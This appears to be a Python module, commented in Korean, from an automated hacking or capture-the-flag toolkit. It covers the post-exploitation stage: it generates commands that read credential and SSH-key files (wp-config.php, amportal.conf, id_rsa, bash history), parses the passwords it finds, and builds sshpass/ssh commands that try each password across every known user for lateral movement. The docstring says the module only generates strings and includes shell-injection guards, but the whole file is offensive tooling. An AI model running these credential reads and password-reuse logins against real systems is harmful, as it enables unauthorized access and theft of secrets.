"""발판 후 자격 수확 — 설정/DB 파일 위치 + 제품별 키 파싱 + 측면이동 후보 (D단계).

자동 루트 실패의 한 축: 웹 RCE 로 www-data 를 얻어도 user.txt 는 보통 '다른 유저' 소유라
못 읽는다. 돌파구는 **설정파일/DB 자격을 읽어 그 유저로 측면이동(su/ssh)** 하는 것.
이 모듈은 그 재료를 생성한다(생성 전용):
  1. `config_reads(product)` — 발판 셸에서 읽을 설정/민감파일 목록(`cat … 2>/dev/null` 명령 생성).
  2. `parse_config_creds(text)` — 읽어 온 설정 본문에서 자격 추출(일반 harvest + 제품 키).
  3. `lateral_candidates(creds, users, target)` — 자격×유저로 su/ssh 재사용 후보 명령 생성.

안전 경계(불변): 명령/자격 **문자열 생성·파싱만** 한다. `cat` 실행도 su/ssh 실행도 하지
않는다(발판 셸에서의 실제 실행은 사용자 리포의 ShellSession 발사 — RCE 실행 표면).
"""
from __future__ import annotations

import re
import shlex

from .creds_harvest import harvest, is_safe_for_cmd


def _arg_ok(val: str) -> bool:
    """명령 인자로 안전한지 — 셸 인젝션 방지(is_safe_for_cmd)에 더해, 선행 '-' 를 막아
    ssh/sshpass 가 값을 '옵션'(예: -oProxyCommand=…)으로 오인하는 인자 인젝션까지 차단한다.
    lateral.py 와 동일하게 실제 주입은 shlex.quote 로 한 번 더 감싼다(심층 방어)."""
    return is_safe_for_cmd(val) and not val.startswith("-")

# 제품별로 발판 셸에서 읽어볼 설정/자격 파일(상대·절대 혼재 — 경로는 머신마다 다를 수 있음).
_CONFIG_FILES: dict[str, list[str]] = {
    "freepbx": ["/etc/amportal.conf", "/etc/freepbx.conf",
                "/etc/asterisk/manager.conf", "/var/www/html/admin/bootstrap.php"],
    "elastix": ["/etc/amportal.conf", "/etc/elastix.conf", "/etc/asterisk/manager.conf"],
    "wordpress": ["/var/www/html/wp-config.php", "wp-config.php"],
    "joomla": ["/var/www/html/configuration.php", "configuration.php"],
    "drupal": ["/var/www/html/sites/default/settings.php", "sites/default/settings.php"],
    "nextcloud": ["/var/www/html/config/config.php", "config/config.php"],
    "gitea": ["/etc/gitea/app.ini", "custom/conf/app.ini"],
    "grafana": ["/etc/grafana/grafana.ini"],
}
# 제품 무관하게 흔히 자격이 있는 곳(항상 추가).
_GENERIC_FILES = [
    ".env", "/var/www/html/.env", "config.php", "config.inc.php",
    "/home/*/.bash_history", "~/.bash_history", "/home/*/.ssh/id_rsa",
    "/var/www/.mysql_history",
]

# FreePBX/Elastix amportal.conf 류 — 표준 KEY=VALUE 지만 키 이름이 특수(AMPDBUSER 등)라
# 일반 harvest(user/pass 키)로는 안 잡힌다. 사용자/비번 키를 짝지어 뽑는다.
_AMP_USER = re.compile(r"(?im)^\s*(AMPDBUSER|AMPMGRUSER)\s*=\s*(\S+)")
_AMP_PASS = re.compile(r"(?im)^\s*(AMPDBPASS|AMPMGRPASS)\s*=\s*(\S+)")


def config_reads(product: str = "") -> list[str]:
    """발판 셸에서 읽을 설정/민감파일 'cat 명령' 목록(생성 전용 — 실행 아님).
    제품 지정 시 제품별 경로 + 일반 경로, 미지정이면 일반 경로만. 중복 제거."""
    files: list[str] = []
    files += _CONFIG_FILES.get((product or "").lower().strip(), [])
    files += _GENERIC_FILES
    cmds: list[str] = []
    seen: set[str] = set()
    for f in files:
        if f not in seen:
            seen.add(f)
            cmds.append(f"cat {f} 2>/dev/null")
    return cmds


def parse_config_creds(text: str) -> list[tuple[str, str, str]]:
    """설정 본문에서 (user, pass, 출처라벨) 추출. 일반 harvest + FreePBX amportal 키.
    실행 아님 — 순수 파싱. 중복 제거."""
    out: list[tuple[str, str, str]] = []
    seen: set[tuple[str, str]] = set()

    def _add(u: str, p: str, label: str) -> None:
        u, p = (u or "").strip(), (p or "").strip()
        if u and p and (u, p) not in seen:
            seen.add((u, p))
            out.append((u, p, label))

    # 일반 고신뢰 패턴(URL 자격·user/pass 키)
    for u, p in harvest(text):
        _add(u, p, "generic")
    # FreePBX/Elastix amportal: AMPDBUSER/AMPDBPASS, AMPMGRUSER/AMPMGRPASS 짝
    users = {m.group(1).replace("USER", ""): m.group(2) for m in _AMP_USER.finditer(text or "")}
    passes = {m.group(1).replace("PASS", ""): m.group(2) for m in _AMP_PASS.finditer(text or "")}
    for prefix, pw in passes.items():
        user = users.get(prefix, prefix.lower() or "admin")
        _add(user, pw, f"amportal:{prefix or 'AMP'}")
    return out


def lateral_candidates(creds: list[tuple[str, str]], users: list[str],
                       target: str) -> list[str]:
    """자격 × 유저로 측면이동(su/ssh 재사용) 후보 '명령 문자열'을 만든다(생성 전용).
    · 각 (u,p) 는 그 유저로 직접 로그인 시도.
    · 비번 재사용: 각 자격의 비번을 알려진 시스템 유저 전부에 교차 시도(흔한 실전 경로).
    셸 인젝션 안전값만 명령에 넣는다(신뢰불가 출처 방어). 실행은 사용자 몫."""
    cmds: list[str] = []
    seen: set[str] = set()
    pw_pool = {p for _, p in creds if _arg_ok(p)}
    login_users = []
    for u in [u for u, _ in creds] + list(users):
        if u and u not in login_users and _arg_ok(u):
            login_users.append(u)

    def _add(c: str) -> None:
        if c not in seen:
            seen.add(c)
            cmds.append(c)

    tgt = shlex.quote(target or "<타겟 IP>")

    def _ssh(p: str, u: str) -> str:
        return (f"sshpass -p {shlex.quote(p)} ssh -o StrictHostKeyChecking=no "
                f"{shlex.quote(u)}@{tgt} id")
    # 1) 자격 그대로
    for u, p in creds:
        if _arg_ok(u) and _arg_ok(p):
            _add(_ssh(p, u))
    # 2) 비번 재사용(교차) — 자격 유저 아닌 시스템 유저에도
    for p in sorted(pw_pool):
        for u in login_users:
            _add(_ssh(p, u))
    return cmds
